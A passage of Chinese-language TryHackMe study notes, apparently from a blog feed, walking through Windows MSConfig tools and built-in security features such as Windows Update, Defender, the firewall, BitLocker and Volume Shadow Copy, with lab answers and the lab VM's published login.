                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402091028314.png"
                      alt="image-20230402091028314"
                ></p>
<p>你可以使用类似的命令查看其他有用的<code>net</code>子命令的帮助信息，例如<code>localgroup</code>、<code>use</code>、<code>share</code>和<code>session</code>。</p>
<p>请参考下面的链接，以查看你可以在命令提示符中执行的命令的相关列表： <a class="link"   href="https://ss64.com/nt/" >https://ss64.com/nt/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><strong>答题</strong></p>
<p><em>tips：阅读本小节内容并且访问Windows虚拟机进行探索，然后回答以下问题。</em></p>
<p>访问由实验房间所提供的Windows虚拟机，并进行相关探索。</p>
<p><em><strong>问题1：在系统配置中，Internet 协议配置的完整命令是什么？</strong></em></p>
<p>导航到MSConfig面板的“工具”选项卡并找到“Internet 协议配置”工具，查看“Selected command”部分即可。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402092105770.png"
                      alt="image-20230402092105770"
                ></p>
<blockquote>
<p>答案1：C:\Windows\System32\cmd.exe &#x2F;k %windir%\system32\ipconfig.exe</p>
</blockquote>
<p><em><strong>问题2：对于 ipconfig 命令，如何显示其详细信息？</strong></em></p>
<p>启动cmd工具，并输入<code>ipconfig /?</code>命令以查看相关的帮助信息：</p>
<p>tips：ipconfig 命令将显示计算机的网络地址设置。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402094749041.png"
                      alt="image-20230402094749041"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402094951203.png"
                      alt="image-20230402094951203"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402095102296.png"
                      alt="image-20230402095102296"
                ></p>
<blockquote>
<p>答案2：ipconfig &#x2F;all</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402005656334.png"
                      alt="image-20230402005656334"
                ></p>
<h2 id="注册表编辑器"><a href="#注册表编辑器" class="headerlink" title="注册表编辑器"></a>注册表编辑器</h2><p>我们将继续探索可通过“系统配置”面板使用的工具——Registry Editor （<code>regedit</code>）。</p>
<p>Windows注册表是一个中央分层数据库，它用于存储配置系统所需的信息，这些信息适用于一个或多个用户、应用程序和硬件设备。</p>
<p>注册表包含 Windows 在运行期间不断引用的信息，例如：</p>
<ul>
<li>每个用户的配置文件。</li>
<li>计算机上安装的应用程序和每个应用程序可以创建的文档类型。</li>
<li>文件夹和应用程序图标的属性表设置。</li>
<li>系统上存在哪些硬件。</li>
<li>正在使用的端口。</li>
</ul>
<p>警告：注册表仅适用于高级计算机用户设置，随意更改注册表会影响正常的计算机操作。 </p>
<p>有多种方法可以查看&#x2F;编辑注册表。其中一种方法是使用注册表编辑器( <code>regedit</code>)。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402005424423.png"
                      alt="image-20230402005424423"
                ></p>
<p>请参阅<a class="link"   href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/performance/windows-registry-advanced-users" >Microsoft相关文档 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>以了解更多有关Windows注册表的信息。</p>
<p><strong>答题</strong></p>
<p><em>tips：阅读本小节内容并且访问Windows虚拟机进行探索，然后回答以下问题。</em></p>
<p>访问由实验房间所提供的Windows虚拟机，并进行相关探索。</p>
<p><strong>问题：打开注册表编辑器的命令是什么？（以相关的exe文件名称作答即可）</strong></p>
<p>导航到MSConfig面板的“工具”选项卡并找到“注册表编辑器”工具，查看“Selected command”部分即可。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402085801146.png"
                      alt="image-20230402085801146"
                ></p>
<blockquote>
<p>答案：regedt32.exe</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402005539209.png"
                      alt="image-20230402005539209"
                ></p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>回顾：本文所介绍的主要内容是一些可以从Windows<code>MSConfig</code> 启动的工具。</p>
<p>在Window操作系统中，实用程序的命令和快捷方式是共享的，这意味着你不必启动<code>MSConfig</code>（系统配置）也可运行一些实用程序。</p>
<p>比如：你也可以直接从“开始菜单”界面运行其中一些实用程序：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230331104050610.png"
                      alt="image-20230331104050610"
                ></p>
<p><code>MSConfig</code>中所列出的工具并未在本文中全部提及，你可以自行探索<code>MSConfig</code>中的其他工具。</p>
]]></content>
      <categories>
        <category>TryHackMe笔记</category>
      </categories>
      <tags>
        <tag>TryHackMe</tag>
        <tag>网络安全基础</tag>
        <tag>BlueTeam</tag>
      </tags>
  </entry>
  <entry>
    <title>THM-Windows Fundamentals  3(Windows基础知识3)-学习</title>
    <url>/2024/01/27/THM-Windows%20Fundamentals%203(Windows%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%863)-%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>本文相关的TryHackMe实验房间链接：<a class="link"   href="https://tryhackme.com/room/windowsfundamentals3xzx" >https://tryhackme.com/room/windowsfundamentals3xzx <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>本文介绍：本文所涉及的内容是 Windows 基础模块的第 3 部分，了解有助于保护设备安全的内置 Microsoft 工具，例如 Windows 更新、Windows 安全、BitLocker等…</p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>在Windows Fundamentals 1中，我们介绍了Windows的桌面、文件系统、用户帐户控制、控制面板、设置和任务管理器。 </p>
<p>在Windows Fundamentals 2中，我们介绍了Windows的各种实用程序，例如系统配置面板、计算机管理界面、资源监视器等。</p>
<p>本文将尝试概述 Windows 操作系统中的一些安全功能。</p>
<p>启动本文相关实验房间中所附加的Windows虚拟机（你可以直接在浏览器中访问），如果你希望通过远程桌面访问虚拟机，请使用以下凭据：</p>
<ul>
<li>Machine IP: <code>MACHINE_IP</code>（在实验房间中启动Windows虚拟机之后，你将获得一个相关的ip地址）</li>
<li>User: <code>administrator</code></li>
<li>Password: <code>letmein123!</code></li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230331104939724.png"
                      alt="image-20230331104939724"
                ></p>
<p>当上述界面弹出提示时，点击接受证书，然后你现在应该可以登录到远程系统。</p>
<h2 id="Windows更新（-Windows-Update）"><a href="#Windows更新（-Windows-Update）" class="headerlink" title="Windows更新（ Windows Update）"></a>Windows更新（ Windows Update）</h2><p>让我们从Windows Update开始。</p>
<p>Windows Update是微软提供的一项服务，可为Windows操作系统和其他微软产品(如Microsoft Defender)提供安全更新、功能增强和补丁。</p>
<p>Windows 更新通常在每个月的第二个星期二发布，这一天被称为补丁星期二，但是这并不一定意味着一个关键的更新&#x2F;补丁必须等到下一个补丁星期二才会发布；如果某个更新补丁很重要，微软则将通过Windows更新服务向Windows设备推送更新。</p>
<p>Windows更新服务可通过“设置-Settings”面板找到并访问，更多相关信息可查看<a class="link"   href="https://msrc.microsoft.com/update-guide" >微软安全更新指南 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
<p>tips：另一种访问Windows更新服务的方法是使用Run对话框或者使用CMD界面，然后运行以下命令<code>control /name Microsoft.WindowsUpdate</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402112207713.png"
                      alt="image-20230402112207713"
                ></p>
<p>Windows更新设置是“受监管的”(通常情况下，家庭用户不会看到这种类型的消息)，如果计算机没有连接到Internet，则无法与Microsoft通信以获取最新的更新信息。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402112622623.png"
                      alt="image-20230402112622623"
                ></p>
<p>多年以来，Windows用户已经习惯于将Windows更新推迟到较晚的日期或者根本不安装更新，导致此类操作的原因有很多，其中一个原因是：Windows在更新之后通常需要重新启动。</p>
<p>微软在Windows 10中尝试解决了用户更新问题，现在的Windows更新不能再被忽视或完全不管不顾，也就是说Windows更新虽然能推迟，但最终还是会发生，更新完成之后你的电脑也会重新启动。微软通过提供此类强制更新服务来尽量保证设备的安全。</p>
<p>如下图所示，在Windows更新界面中可看到此时计算机需要重启，此更新界面还提供了关于安排重启的几个可用选项。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402113525741.png"
                      alt="image-20230402113525741"
                ></p>
<p>更多信息请参考<a class="link"   href="https://support.microsoft.com/en-us/windows/windows-update-faq-8a903416-6f45-0718-f5c7-375e92dddeb2" >Windows更新常见问题解答 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
<p><strong>答题</strong></p>
<p><em>tips：阅读本小节内容并且访问Windows虚拟机进行探索，然后回答以下问题。</em></p>
<p>访问由实验房间所提供的Windows虚拟机，并进行相关探索。</p>
<p>通过“设置”面板访问Windows更新服务，在Windows更新界面点击“查看更新历史”：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402132839575.png"
                      alt="image-20230402132839575"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402132937163.png"
                      alt="image-20230402132937163"
                ></p>
<blockquote>
<p>自定义更新的安装日期是：5&#x2F;3&#x2F;2021</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402113919880.png"
                      alt="image-20230402113919880"
                ></p>
<h2 id="Windows安全（Windows-Security）"><a href="#Windows安全（Windows-Security）" class="headerlink" title="Windows安全（Windows Security）"></a>Windows安全（Windows Security）</h2><p>根据微软的说法，“Windows Security是管理保护你的设备和数据的工具的主界面。”</p>
<p>和Windows更新服务一样，Windows安全服务也可以通过“设置-Settings”面板进行访问。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402132307179.png"
                      alt="image-20230402132307179"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402114542296.png"
                      alt="image-20230402114542296"
                ></p>
<p>请查看上图，并将注意力集中在<em><strong>Protection areas</strong></em>（保护区域），其中包括：</p>
<ul>
<li>Virus &amp; threat protection（病毒和威胁防护）</li>
<li>Firewall &amp; network protection（防火墙和网络保护）</li>
<li>App &amp; browser control（应用程序和浏览器控制）</li>
<li>Device security（设备安全）</li>
</ul>
<p>tips：在下面几个小节中我们会简要地介绍以上四部分内容（在本小节中我们不展开讲解）。</p>
<p>在继续介绍Windows安全服务之前，让我们快速了解一下状态图标：</p>
<ul>
<li>绿色图标：表示你的设备已得到充分保护，并且没有任何建议操作。</li>
<li>黄色图标：表示有安全建议供你查看。</li>
<li>红色图标：表示警告，即有某件事情需要你立即关注。</li>
</ul>
<p>我们点击“设置-Settings”界面中的“Windows Security”下的<code>Open Windows Security</code>，将看到如下界面（一个红色图标，三个绿色图标）：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402115417123.png"
                      alt="image-20230402115417123"
                ></p>
<p>注意：由于本文所附的实验机是Windows Server 2019，因此相关页面看起来会与Windows 10家庭版或专业版不同。</p>
<p>下图是来自于Windows 10设备的Windows Security相关页面（点击<code>Open Windows Security</code>即可看到具体界面）：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402115601501.png"
                      alt="image-20230402115601501"
                ></p>
<p>在下一小节，我们将继续查看Windows安全服务中的“病毒和威胁防护”部分。</p>
<p><strong>答题</strong></p>
<p><em>tips：阅读本小节内容并且访问Windows虚拟机进行探索，然后回答以下问题。</em></p>
<p>访问由实验房间所提供的Windows虚拟机，并进行相关探索。</p>
<p>查看“Windows安全”界面，我们可以发现Virus &amp; threat protection（病毒和威胁防护）对应的图标是红色的——红色图标表示警告，所以需要我们立即关注。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402135755579.png"
                      alt="image-20230402135755579"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402120607299.png"
                      alt="image-20230402120607299"
                ></p>
<h2 id="病毒和威胁防护（Virus-threat-protection）"><a href="#病毒和威胁防护（Virus-threat-protection）" class="headerlink" title="病毒和威胁防护（Virus &amp; threat protection）"></a>病毒和威胁防护（Virus &amp; threat protection）</h2><p>病毒和威胁防护分为以下部分：</p>
<ul>
<li>当前威胁——Current threats</li>
<li>病毒和威胁防护设置——Virus &amp; threat protection settings</li>
<li>病毒和威胁防护更新——Virus &amp; threat protection updates</li>
<li>勒索软件防护——Ransomware protection</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402135055783.png"
                      alt="image-20230402135055783"
                ></p>
<p><strong>Current threats(当前威胁)</strong></p>
<p>下图是“当前威胁”部分界面：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402122307444.png"
                      alt="image-20230402122307444"
                ></p>
<p>我们可以通过Current threats界面点击并选择“扫描选项”（Scan options），相关的内容如下：</p>
<ul>
<li>Quick scan（快速扫描）：检查系统中通常可能存在威胁项目的文件夹。</li>
<li>Full scan（全面扫描）：检查硬盘上的所有文件和正在运行的程序，此扫描可能需要一个多小时。</li>
<li>Custom scan（自定义扫描）：任意选择你想要检查的文件和位置，然后开始扫描。</li>
</ul>
<p>我们可以通过Current threats界面点击并查看“威胁历史”（Threat history），相关的内容如下：</p>
<ul>
<li>Last scan（上次扫描）：Windows Defender防病毒软件会自动扫描你的设备是否存在病毒和其他威胁，以帮助保护你的设备安全。</li>
<li>Quarantined threats（隔离的威胁）：是指已被隔离的威胁项目，隔离能有效阻止威胁项目在你的设备上运行，此外，被隔离的威胁项目将会被定期删除。</li>
<li>Allowed threats（允许的威胁）：是指你允许“已经被识别为威胁的项目”在你的设备上运行。</li>
</ul>
<p>警告：只有在100%确定自己在做什么时，才允许运行已被识别为威胁的项目。</p>
<p><strong>Virus &amp; threat protection settings(病毒和威胁防护设置)</strong></p>
<p>下图是“病毒和威胁防护设置”部分界面：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402134413535.png"
                      alt="image-20230402134413535"
                ></p>
<p>在上图中的Virus &amp; threat protection settings界面点击并查看“管理设置”（Manage settings），相关的内容如下：</p>
<ul>
<li>Real-time protection（实时保护）：实时定位并阻止恶意软件在你的设备上安装或运行。</li>
<li>Cloud-delivered protection（云提供的保护）：通过访问云中的最新保护数据以提供增强保护和更快的保护。</li>
<li>Automatic sample submission（自动提交样本）：将可能具有安全威胁的样本文件发送到 Microsoft，以帮助保护你和其他人免受潜在威胁。 </li>
<li>Controlled folder access（控制文件夹访问权限）：保护你设备上的文件、文件夹和内存区域免受不友好应用程序未经授权的更改。</li>
<li>Exclusions（排除）：Windows Defender防病毒软件不会扫描你已排除的项目。</li>
<li>Notifications（通知）：允许Windows Defender防病毒软件发送通知，其中会包含有关设备健康和安全的重要信息。</li>
</ul>
<p>警告：你所排除的项目也可能会包含一些能让你的设备受到攻击的危险应用程序，所以，只有当你100%确定自己在做什么时才能使用此选项。</p>
<p><strong>Virus &amp; threat protection updates(病毒和威胁防护更新)</strong></p>
<p>下图是“病毒和威胁防护更新”部分界面：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402134527557.png"
                      alt="image-20230402134527557"
                ></p>
<p>查看上图中的“病毒和威胁防护更新”（Virus &amp; threat protection updates）下的“Check for updates”：</p>
<ul>
<li><p>Check for updates（检查更新）： 手动检查更新以更新 Windows Defender防病毒软件的反病毒规则。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402134647659.png"
                      alt="image-20230402134647659"
                ></p>
</li>
</ul>
<p><strong>Ransomware protection(勒索软件防护)</strong></p>
<p>下图是“勒索软件防护”部分界面：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402134558602.png"
                      alt="image-20230402134558602"
                ></p>
<p>查看上图中的“勒索软件防护”（Ransomware protection）下的“Manage ransomware protection”：</p>
<ul>
<li><p>Controlled folder access（控制文件夹访问权限）：勒索软件防护需要启用此功能，但是为了启用此功能你需要首先启用实时保护功能。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402133423850.png"
                      alt="image-20230402133423850"
                ></p>
</li>
</ul>
<p><em>tips：你可以对任何文件&#x2F;文件夹执行按需安全扫描，只需右键单击项目并选择“使用Microsoft Defender扫描”即可。</em></p>
<p>下图是来自于另一个Windows设备，以展示按需扫描功能：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402123519987.png"
                      alt="image-20230402123519987"
                ></p>
<p><strong>答题</strong></p>
<p><em>tips：阅读本小节内容并且访问Windows虚拟机进行探索，然后回答以下问题。</em></p>
<p>访问由实验房间所提供的Windows虚拟机，并进行相关探索。</p>
<p>基于上一小节的答题任务可知，我们需要关注的内容是“病毒和威胁防护”，因此我们可以查看“病毒和威胁防护”面板以找到更多详细信息：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402135608336.png"
                      alt="image-20230402135608336"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402140016742.png"
                      alt="image-20230402140016742"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402123705311.png"
                      alt="image-20230402123705311"
                ></p>
<h2 id="防火墙和网络保护（Firewall-network-protection）"><a href="#防火墙和网络保护（Firewall-network-protection）" class="headerlink" title="防火墙和网络保护（Firewall &amp; network protection）"></a>防火墙和网络保护（Firewall &amp; network protection）</h2><p><strong>什么是firewall（防火墙）?</strong></p>
<p>根据微软的说法，“流量是通过端口流入和流出设备的，而防火墙能够控制什么可以（更重要的是不可以）通过这些端口；你可以把防火墙想象成一个站在门口的保安，它会检查所有试图进出的人的ID信息”。</p>
<p>我们可以导航到“防火墙和网络保护”界面：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402143136894.png"
                      alt="image-20230402143136894"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402140909388.png"
                      alt="image-20230402140909388"
                ></p>
<p>注意：上图中的每个选项可能会有不同的状态图标。</p>
<p>我们在“防火墙和网络保护”界面中所看到的“Domain network”、“Private network ”和“Public network ”三者之间有什么区别?</p>
<p>根据微软的说法，“Windows防火墙会提供三种防火墙配置：域、私有和公共”。</p>
<ul>
<li>Domain（域）：防火墙的域配置适用于主机系统可以向域控制器进行身份验证的网络。</li>
<li>Private （私有）：防火墙的私有配置是用户分配的配置，可用于指定私有或家庭网络。</li>
<li>Public （公共）：防火墙的默认配置为Public，可用于指定公共网络，例如咖啡店、机场和其他地点的Wi-Fi热点。</li>
</ul>
<p>如果你单击任何一种防火墙配置，则将出现对应的相关配置页面，其中会包含两个选项：打开&#x2F;关闭防火墙、阻止所有传入连接。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402141951302.png"
                      alt="image-20230402141951302"
                ></p>
<p>警告：除非你对你正在做的事情有100%的信心，否则建议你开启Windows Defender 防火墙。</p>
<p>接下来我们关注“防火墙和网络保护”界面的“Allow an app through firewall”和“Advanced Settings”：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402142228875.png"
                      alt="image-20230402142228875"
                ></p>
<p><strong>Allow an app through firewall</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402142409767.png"
                      alt="image-20230402142409767"
                ></p>
<p>你可以查看任何防火墙配置的当前设置，在上图中，我们可以看到有一些应用程序可以访问私有或者公共防火墙配置，如果你点击“详细信息-Details”按钮，则能获取到对应应用程序所提供的一些额外信息。</p>
<p><strong>Advanced Settings</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402142440552.png"
                      alt="image-20230402142440552"
                ></p>
<p>配置Windows Defender防火墙的操作适用于Windows高级用户，你可以参考<a class="link"   href="https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-firewall/best-practices-configuring" >相关的Microsoft 官方文档 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
<p>tips：打开Windows Defender防火墙的命令为<code>WF.msc</code>。</p>
<p><strong>答题</strong></p>
<p>tips：通过阅读本小节相关内容，可回答以下问题。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402143709102.png"
                      alt="image-20230402143709102"
                ></p>
<h2 id="应用程序和浏览器控制（App-browser-control）"><a href="#应用程序和浏览器控制（App-browser-control）" class="headerlink" title="应用程序和浏览器控制（App &amp; browser control）"></a>应用程序和浏览器控制（App &amp; browser control）</h2><p>在此部分中，你可以更改Microsoft Defender SmartScreen的设置。</p>
<p>根据 Microsoft 的说法，“ Microsoft Defender SmartScreen 可以防止网络钓鱼、恶意软件网站和应用程序以及潜在恶意文件的下载”。</p>
<p>有关 Microsoft Defender SmartScreen 的更多信息，请参阅<a class="link"   href="https://docs.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-smartscreen/microsoft-defender-smartscreen-overview" >相关的Microsoft官方文档 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402184152523.png"
                      alt="image-20230402184152523"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402144528956.png"
                      alt="image-20230402144528956"
                ></p>
<p><strong>Check apps and files</strong></p>
<p>Windows Defender SmartScreen 通过检查来自网络的 无法识别的应用程序和文件来帮助保护你的设备。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402144656769.png"
                      alt="image-20230402144656769"
                ></p>
<p><strong>Exploit protection</strong></p>
<p>Exploit protection 内置在Windows 10操作系统(本文相关的实验机为Windows Server 2019)中，能够帮助保护你的设备免受恶意攻击。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402144921155.png"
                      alt="image-20230402144921155"
                ></p>
<p>警告：除非你对所做的事情有100%的信心，否则建议你保持上图中的默认设置。</p>
<h2 id="设备安全（Device-security）"><a href="#设备安全（Device-security）" class="headerlink" title="设备安全（Device security）"></a>设备安全（Device security）</h2><p>尽管你可能永远不会更改以下设置，但我们还是会简要介绍一下。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402184241911.png"
                      alt="image-20230402184241911"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402150319201.png"
                      alt="image-20230402150319201"
                ></p>
<p><strong>Core isolation（核心隔离）</strong></p>
<ul>
<li>Memory Integrity（内存完整性）：防止攻击者将恶意代码插入高安全性进程。</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402145704103.png"
                      alt="image-20230402145704103"
                ></p>
<p>警告：除非你对所做的事情有100%的信心，否则建议你保持默认设置。</p>
<p>下面的图片来自于另一台机器，展示了个人Windows 10设备应该具备的另一个安全功能——Security processor。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402145809858.png"
                      alt="image-20230402145809858"
                ></p>
<p>下面是Security processor（安全处理器）的详细信息。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402150039454.png"
                      alt="image-20230402150039454"
                ></p>
<p>上图所提及的可信平台模块(TPM-Trusted Platform Module)是什么？</p>
<p>根据微软的说法，“可信平台模块(TPM)技术旨在提供基于硬件的安全相关功能。TPM芯片是一种安全的加密处理器，被设计用于执行加密操作，该芯片包括多种物理安全机制，使其具有抗篡改性，恶意软件无法篡改TPM的安全功能”。</p>
<p><strong>答题</strong></p>
<p>tips：阅读本小节内容，可回答以下问题。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402150412883.png"
                      alt="image-20230402150412883"
                ></p>
<h2 id="BitLocker"><a href="#BitLocker" class="headerlink" title="BitLocker"></a>BitLocker</h2><p>什么是<strong>BitLocker</strong>？</p>
<p>根据微软的说法，“ BitLocker驱动器加密是一种数据保护功能，它与操作系统集成在一起，可以解决数据被盗的威胁，数据被盗指的是由于计算机丢失、计算机被盗或者不当停用的旧计算机被利用等因素而导致的数据泄露”。</p>
<p>在安装了 TPM 的设备上，BitLocker 能提供最好的数据保护。</p>
<p>根据 Microsoft 的说法，“ BitLocker 在与可信平台模块 (TPM) 1.2 或更高版本的TPM一起使用时能够提供最大的保护。TPM 是一种计算机制造商安装在许多较新计算机中的硬件组件，它可以与 BitLocker 一起帮助保护用户数据以及能够确保计算机在系统离线时不被篡改数据”。</p>
<p>请参阅<a class="link"   href="https://docs.microsoft.com/en-us/windows/security/information-protection/bitlocker/bitlocker-overview" >相关的Microsoft官方文档 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>以了解有关 BitLocker 的更多信息。 </p>
<p>注意：本文相关的实验房间所附加的虚拟机中不包含 BitLocker 功能。</p>
<p><strong>答题</strong></p>
<p>tips：请参阅有关 BitLocker 的 Microsoft 文档，然后回答以下问题。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402183226395.png"
                      alt="image-20230402183226395"
                ></p>
<p>翻译页面：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402183931261.png"
                      alt="image-20230402183931261"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402183012938.png"
                      alt="image-20230402183012938"
                ></p>
<h2 id="卷影复制服务（Volume-Shadow-Copy-Service）"><a href="#卷影复制服务（Volume-Shadow-Copy-Service）" class="headerlink" title="卷影复制服务（Volume Shadow Copy Service）"></a>卷影复制服务（Volume Shadow Copy Service）</h2><p>根据<a class="link"   href="https://learn.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service" >微软官方相关文档 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>的说法：卷影复制服务(VSS-Volume Shadow Copy Service)能够协调所需的操作 以创建与要备份的数据一致的影子副本(也被称为快照或时间点拷贝)。</p>
<p>卷影副本会存储在每个启用了保护功能的驱动器上的“系统卷信息”文件夹中。</p>
<p>如果启用了VSS(这需要先启动系统保护)，你就可以在“高级系统设置”页面中执行以下任务：</p>
<ul>
<li>创建还原点</li>
<li>执行系统恢复（还原）</li>
<li>配置还原设置</li>
<li>删除还原点</li>
</ul>
<p>从安全的角度来看，恶意软件编写者可能知道这个Windows特性（此处指的是VSS），并会在恶意软件中编写代码 以便查找备份文件并删除它们；这样攻击者这样做，那么我们就不可能从勒索软件攻击中恢复数据，除非我们另有离线&#x2F;异地备份。</p>
<p>如果你希望配置影子副本，请参考以下图片：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402191730722.png"
                      alt="image-20230402191730722"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402192812926.png"
                      alt="image-20230402192812926"
                ></p>
<p>注意：选中系统卷（如c:\）并点击上图中的“Enable”，即可成功创建一个卷影副本。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402192739427.png"
                      alt="image-20230402192739427"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402193151086.png"
                      alt="image-20230402193151086"
                ></p>
<p><strong>答题</strong></p>
<p>tips：阅读本小节内容，可回答以下问题。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402191908942.png"
                      alt="image-20230402191908942"
                ></p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>在本文中，我们介绍了几个内置的 Windows 安全工具，这些工具会随 Windows 操作系统一起被提供给用户，以帮助我们更好地保护计算机设备。</p>
<p>关于 Windows 操作系统，还有很多内容需要解释和涵盖。本文包括前两篇系列文章都只是对Windows操作系统进行了一些基础介绍，如果想了解有关 Windows 操作系统的更多信息，你还需要自己继续开展相关的学习。</p>
<p>延伸阅读材料：</p>
<ul>
<li><a class="link"   href="https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal" >Antimalware Scan Interface <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard-manage" >Credential Guard <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>[Windows 10 Hello](<a class="link"   href="https://support.microsoft.com/en-us/windows/learn-about-windows-hello-and-set-it-up-dae28983-8242-bb2a-d3d1-87c9d265a5f0#:~:text=Windows" >https://support.microsoft.com/en-us/windows/learn-about-windows-hello-and-set-it-up-dae28983-8242-bb2a-d3d1-87c9d265a5f0#:~:text=Windows <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 10,in with just your PIN.)</li>
